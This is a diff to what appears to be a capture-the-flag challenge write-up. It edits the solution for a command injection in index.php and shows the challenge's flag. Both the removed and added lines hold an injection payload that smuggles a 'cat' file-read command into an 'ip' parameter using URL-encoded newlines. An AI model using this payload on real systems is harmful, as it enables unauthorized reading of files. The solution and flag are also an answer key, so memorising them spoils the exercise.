@@ -19,7 +19,7 @@ Find the flag at /flag :D
 - index.php
 
 ## Solution
-1. ip=%0Acat /fla*%0A127.0.0.1
+1. ip=%0Acat fla*.txt%0A127.0.0.1
 
 ### Flag
 `HNF{y0u_f0und_me}`
